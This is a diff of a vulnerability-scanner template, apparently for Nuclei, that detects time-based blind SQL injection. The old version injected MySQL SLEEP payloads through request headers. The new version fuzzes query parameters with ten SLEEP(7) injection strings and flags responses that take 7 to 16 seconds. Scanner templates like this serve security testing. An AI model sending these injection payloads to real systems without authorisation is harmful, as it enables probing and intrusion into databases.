@@ -1,26 +1,33 @@
 id: time-based-sqli
-
 info:
-  name: Time-based SQLI
-  author: z3r0yu
-  severity: medium
-  description: |
-    MySQL Time Based SQLi.
-  reference: https://github.com/sqlmapproject/sqlmap/issues/4091
-  tags: sqli
-
-requests:
+  name: Time-Based Blind SQL Injection
+  author: Coffinxp/lostsec
+  severity: Critical
+  description: Detects time-based blind SQL injection vulnerability
+http:
   - method: GET
     path:
-      - "{{BaseURL}}"
-    headers:
-      User-Agent: "0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z"
-      Referer: "0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z"
-      X-Forwarded-For: "0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z"
-      Useref: "0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z"
-    
-    # matchers-condition: and
+        - "{{BaseURL}}" 
+    payloads:
+      injection:
+      - "(SELECT(0)FROM(SELECT(SLEEP(7)))a)"
+      - "'%2b(select*from(select(sleep(7)))a)%2b'"
+      - "'XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z"
+      - "'XOR(if((select now()=sysdate()),sleep(7),0))XOR'Z"
+      - "X'XOR(if(now()=sysdate(),/**/sleep(7)/**/,0))XOR'X"
+      - "' AND (SELECT 4800 FROM (SELECT(SLEEP(7)))HoBG)--"
+      - "X'XOR(if(now()=sysdate(),(sleep((((7))))),0))XOR'X"
+      - "if(now()=sysdate(),SLEEP(7),0)"
+      - "'XOR(if(now()=sysdate(),SLEEP(7),0))XOR'Z"
+      - "'XOR(SELECT CASE WHEN(1234=1234) THEN SLEEP(7) ELSE 0 END)XOR'Z"
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+            - "{{injection}}"
+    stop-at-first-match: true
     matchers:
-      - type: dsl
-        dsl:
-          - 'duration>=10'
+     - type: dsl
+       dsl:
+       - "duration>=7 && duration <=16"
